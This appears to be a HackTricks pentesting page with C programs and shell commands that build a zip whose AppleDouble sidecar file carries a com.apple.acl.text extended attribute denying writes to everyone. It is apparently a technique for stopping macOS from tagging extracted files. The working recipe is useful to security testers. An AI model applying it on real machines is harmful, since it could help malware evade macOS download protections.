# macOS xattr-acls extra stuff

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
./get_acls test
ACL for test:
!#acl 1
group:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:deny:write,writeattr,writeextattr,writesecurity,chown

ACL in hex: \x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a
```

<details>

<summary>Code of get_acls</summary>

```c
// gcc -o get_acls get_acls
#include <stdio.h>
#include <stdlib.h>
#include <sys/acl.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
        return 1;
    }

    const char *filepath = argv[1];
    acl_t acl = acl_get_file(filepath, ACL_TYPE_EXTENDED);
    if (acl == NULL) {
        perror("acl_get_file");
        return 1;
    }

    char *acl_text = acl_to_text(acl, NULL);
    if (acl_text == NULL) {
        perror("acl_to_text");
        acl_free(acl);
        return 1;
    }

    printf("ACL for %s:\n%s\n", filepath, acl_text);

    // Convert acl_text to hexadecimal and print it
    printf("ACL in hex: ");
    for (char *c = acl_text; *c != '\0'; c++) {
        printf("\\x%02x", (unsigned char)*c);
    }
    printf("\n");

    acl_free(acl);
    acl_free(acl_text);
    return 0;
}
```

</details>

```bash
# Lets add the xattr com.apple.xxx.xxxx with the acls
mkdir start
mkdir start/protected
./set_xattr start/protected
echo something > start/protected/something
```

<details>

<summary>Code of set_xattr</summary>

```c
// gcc -o set_xattr set_xattr.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/xattr.h>
#include <sys/acl.h>


void print_xattrs(const char *filepath) {
    ssize_t buflen = listxattr(filepath, NULL, 0, XATTR_NOFOLLOW);
    if (buflen < 0) {
        perror("listxattr");
        return;
    }

    char *buf = malloc(buflen);
    if (buf == NULL) {
        perror("malloc");
        return;
    }

    buflen = listxattr(filepath, buf, buflen, XATTR_NOFOLLOW);
    if (buflen < 0) {
        perror("listxattr");
        free(buf);
        return;
    }

    printf("All current extended attributes for %s:\n", filepath);
    for (char *name = buf; name < buf + buflen; name += strlen(name) + 1) {
        printf("%s: ", name);
        ssize_t valuelen = getxattr(filepath, name, NULL, 0, 0, XATTR_NOFOLLOW);
        if (valuelen < 0) {
            perror("getxattr");
            continue;
        }

        char *value = malloc(valuelen + 1);
        if (value == NULL) {
            perror("malloc");
            continue;
        }

        valuelen = getxattr(filepath, name, value, valuelen, 0, XATTR_NOFOLLOW);
        if (valuelen < 0) {
            perror("getxattr");
            free(value);
            continue;
        }

        value[valuelen] = '\0';  // Null-terminate the value
        printf("%s\n", value);
        free(value);
    }

    free(buf);
}


int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
        return 1;
    }

    const char *hex = "\x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a";
    const char *filepath = argv[1];

    int result = setxattr(filepath, "com.apple.xxx.xxxx", hex, strlen(hex), 0, 0);
    if (result == 0) {
        printf("Extended attribute set successfully.\n\n");
    } else {
        perror("setxattr");
        return 1;
    }

    print_xattrs(filepath);

    return 0;
}
```

</details>

{% code overflow="wrap" %}
```bash
# Create appledoublefile with the xattr entitlement
ditto -c -k start protected.zip
rm -rf start
# extract the files
unzip protected.zip
# Replace the name of the xattr here (if you put it before ditto would have destroyed it)
python3 -c "with open('._protected', 'rb+') as f: content = f.read().replace(b'com.apple.xxx.xxxx', b'com.apple.acl.text'); f.seek(0); f.write(content); f.truncate()"
# zip everything back together
rm -rf protected.zip
zip -r protected.zip protected ._protected
rm -rf protected
rm ._*
```
{% endcode %}

```bash
# Check if it worked
ditto -x -k --rsrc protected.zip .
xattr -l protected
```

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
